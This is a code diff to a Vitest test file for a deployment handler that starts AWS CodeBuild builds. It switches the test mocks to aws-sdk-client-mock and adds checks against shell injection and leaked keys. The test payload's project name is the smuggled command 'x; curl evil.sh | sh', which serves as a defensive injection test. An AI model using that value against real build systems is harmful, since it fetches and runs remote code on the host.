@@ -1,6 +1,7 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { mockClient } from "aws-sdk-client-mock";
 import { DynamoDBDocumentClient, UpdateCommand } from "@aws-sdk/lib-dynamodb";
+import { CodeBuildClient, StartBuildCommand } from "@aws-sdk/client-codebuild";
 import * as fs from "fs";
 import { tmpdir } from "os";
 import { join } from "path";
@@ -12,7 +13,6 @@ const s3 = vi.hoisted(() => ({
   uploadFile: vi.fn(),
 }));
 const local = vi.hoisted(() => ({ startLocalBuild: vi.fn() }));
-const codebuild = vi.hoisted(() => ({ startBuild: vi.fn(), options: [] as unknown[] }));
 const zip = vi.hoisted(() => ({
   fail: false,
   dirs: [] as string[],
@@ -28,14 +28,6 @@ vi.mock("../../src/utils/S3Client", async (importOriginal) => ({
   ...s3,
 }));
 vi.mock("../../src/utils/localBuildRunner", () => local);
-vi.mock("aws-sdk", () => ({
-  CodeBuild: class {
-    constructor(options: unknown) {
-      codebuild.options.push(options);
-    }
-    startBuild = codebuild.startBuild;
-  },
-}));
 // Stand-in for archiver: "zips" by writing a marker into the output stream.
 vi.mock("archiver", () => ({
   default: () => {
@@ -62,10 +54,11 @@ vi.mock("archiver", () => ({
 import { deploymentTriggeredHandler } from "../../src/api/deployment/deploymentEvent";
 
 const ddb = mockClient(DynamoDBDocumentClient);
+const codebuild = mockClient(CodeBuildClient);
 
 const payload = {
   projectId: "p1",
-  projectName: "Shop",
+  projectName: "x; curl evil.sh | sh",
   model: { id: "d1" } as any,
 };
 
@@ -80,8 +73,7 @@ beforeEach(() => {
   ddb.on(UpdateCommand).resolves({});
   Object.values(s3).forEach((fn) => fn.mockReset());
   s3.uploadFile.mockResolvedValue({ ETag: "e" });
-  codebuild.startBuild.mockReset();
-  codebuild.options.length = 0;
+  codebuild.reset();
   local.startLocalBuild.mockReset();
   zip.fail = false;
   zip.dirs.length = 0;
@@ -92,6 +84,8 @@ afterEach(() => {
   fs.rmSync(workDir, { recursive: true, force: true, maxRetries: 5 });
 });
 
+const startBuildCalls = () => codebuild.commandCalls(StartBuildCommand);
+
 const givenRemoteFiles = (files: Record<string, string | null>, extra: object[] = []) => {
   s3.listFolder.mockResolvedValue([...Object.keys(files).map((Key) => ({ Key })), ...extra]);
   s3.downloadFile.mockImplementation(async (key: string) =>
@@ -101,6 +95,9 @@ const givenRemoteFiles = (files: Record<string, string | null>, extra: object[] 
 
 describe("deploymentTriggeredHandler", () => {
   it("downloads, zips, uploads and starts a CodeBuild deploy", async () => {
+    // Left over from the old configuration; must never reach the build.
+    vi.stubEnv("AWS_KEY", "leaked-key");
+    vi.stubEnv("AWS_SECRET", "leaked-secret");
     givenRemoteFiles(
       {
         "p1/serverless.yml": "service: x",
@@ -111,11 +108,8 @@ describe("deploymentTriggeredHandler", () => {
       },
       [{}]
     );
-    codebuild.startBuild.mockReturnValue({
-      promise: () =>
-        Promise.resolve({
-          build: { id: "b1", buildStatus: "IN_PROGRESS", currentPhase: "QUEUED", buildComplete: false },
-        }),
+    codebuild.on(StartBuildCommand).resolves({
+      build: { id: "b1", buildStatus: "IN_PROGRESS", currentPhase: "QUEUED", buildComplete: false },
     });
 
     await deploymentTriggeredHandler(payload);
@@ -126,19 +120,23 @@ describe("deploymentTriggeredHandler", () => {
     expect(zip.dirs).toEqual([join(downloads, "p1")]);
     expect(s3.uploadFile).toHaveBeenCalledWith("p1.zip", Buffer.from("zip"));
 
-    expect(codebuild.options).toEqual([
-      {
-        region: "eu-west-1",
-        credentials: { accessKeyId: "test-key", secretAccessKey: "test-secret" },
-      },
-    ]);
-    const build = codebuild.startBuild.mock.calls[0][0];
+    const [call] = startBuildCalls();
+    const client = call.thisValue as CodeBuildClient;
+    expect(await client.config.region()).toBe("eu-west-1");
+    const build = call.args[0].input;
     expect(build).toMatchObject({
-      projectName: "sls-code-deploy",
+      projectName: "kanobi-deploy-test",
       sourceTypeOverride: "S3",
       sourceLocationOverride: "kanobi-bucket/p1.zip",
     });
-    expect(build.buildspecOverride).toContain("node ./docs.js -p Shop");
+    // The name reaches the build as data only, never as part of the shell script.
+    expect(build.environmentVariablesOverride).toEqual([
+      { name: "PROJECT_NAME", value: "x; curl evil.sh | sh", type: "PLAINTEXT" },
+    ]);
+    expect(build.buildspecOverride).toContain('node ./docs.js -p "$PROJECT_NAME"');
+    expect(build.buildspecOverride).not.toContain("curl evil");
+    // The build runs as the CodeBuild project's service role: no keys in the buildspec.
+    expect(build.buildspecOverride).not.toMatch(/AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|leaked-key|leaked-secret/);
     expect(build.buildspecOverride).toContain(
       "aws s3 cp ./dist/swagger-json.json s3://kanobi-bucket/p1/swagger-json.json"
     );
@@ -171,8 +169,8 @@ describe("deploymentTriggeredHandler", () => {
     expect(fs.existsSync(join(projectDir, "stale.ts"))).toBe(false);
     expect(fs.existsSync(join(projectDir, "node_modules"))).toBe(false);
     expect(fs.readFileSync(join(projectDir, "serverless.yml"), "utf-8")).toBe("service: x");
-    expect(local.startLocalBuild).toHaveBeenCalledWith(projectDir, "p1", "Shop");
-    expect(codebuild.startBuild).not.toHaveBeenCalled();
+    expect(local.startLocalBuild).toHaveBeenCalledWith(projectDir, "p1", payload.projectName);
+    expect(startBuildCalls()).toHaveLength(0);
     expect(ddb.commandCalls(UpdateCommand)[0].args[0].input.ExpressionAttributeValues).toMatchObject({
       ":isDeploying": true,
       ":buildId": "local:1",
@@ -186,7 +184,7 @@ describe("deploymentTriggeredHandler", () => {
     vi.stubEnv("SERVICE_TABLE", undefined);
     fs.mkdirSync(join(workDir, ".downloads"));
     givenRemoteFiles({ "p1/a.txt": "a" });
-    codebuild.startBuild.mockReturnValue({ promise: () => Promise.resolve({}) });
+    codebuild.on(StartBuildCommand).resolves({});
 
     await deploymentTriggeredHandler(payload);
 
@@ -233,6 +231,16 @@ describe("deploymentTriggeredHandler", () => {
     givenRemoteFiles({});
     s3.uploadFile.mockResolvedValue(undefined);
     await expect(deploymentTriggeredHandler(payload)).rejects.toBe("Failed to upload Zip");
-    expect(codebuild.startBuild).not.toHaveBeenCalled();
+    expect(startBuildCalls()).toHaveLength(0);
+  });
+
+  it("refuses to start a build without CODEBUILD_PROJECT", async () => {
+    vi.stubEnv("CODEBUILD_PROJECT", undefined);
+    givenRemoteFiles({ "p1/a.txt": "a" });
+    await expect(deploymentTriggeredHandler(payload)).rejects.toThrow(
+      "CODEBUILD_PROJECT is not set"
+    );
+    expect(startBuildCalls()).toHaveLength(0);
+    expect(ddb.commandCalls(UpdateCommand)).toHaveLength(0);
   });
 });
